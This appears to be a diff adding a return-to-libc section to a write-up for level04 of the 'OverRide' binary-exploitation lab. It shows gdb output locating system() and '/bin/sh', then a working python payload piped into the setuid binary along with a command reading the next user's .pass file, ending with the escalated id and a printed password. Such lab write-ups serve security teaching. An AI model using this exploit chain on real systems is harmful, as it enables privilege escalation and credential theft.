@@ -1,3 +1,5 @@
+# Ret2libc
+
 ```shell
 ┌──$ [~/42/2022/override]
 └─>  ssh 192.168.56.101 -p 4242 -l level04
@@ -122,4 +124,24 @@ Stack level 0, frame at 0xffffd6c0:
   ebx at 0xffffd6b0, ebp at 0xffffd6b8, edi at 0xffffd6b4, eip at 0xffffd6bc
 gdb-peda$ p/d 0xffffd6bc-0xffffd620
 $1 = 156
+```
+Determine addresses of `system()` and `"/bin/sh"`
+```nasm
+level04@OverRide:~$  gdb ./level04
+gdb-peda$ start
+gdb-peda$ print system
+$1 = {<text variable, no debug info>} 0xf7e6aed0 <system>
+gdb-peda$ find "/bin/sh"
+Searching for '/bin/sh' in: None ranges
+Found 1 results, display max 1 items:
+libc : 0xf7f897ec ("/bin/sh")
+```
+
+## Exploit
+Write the payload and run it
+```shell
+level04@OverRide:~$ (python -c "import struct; print('\x90'*156 + struct.pack('I', 0xf7e6aed0) + '\x90'*4 + struct.pack('I', 0xf7f897ec))"; echo 'id; cat /home/users/$(whoami)/.pass') | ./level04
+Give me some shellcode, k
+uid=1004(level04) gid=1004(level04) euid=1005(level05) egid=100(users) groups=1005(level05),100(users),1004(level04)
+3v8QLcN5SAhPaZZfEasfmXdwyR59ktDEMAwHF3aN
 ```
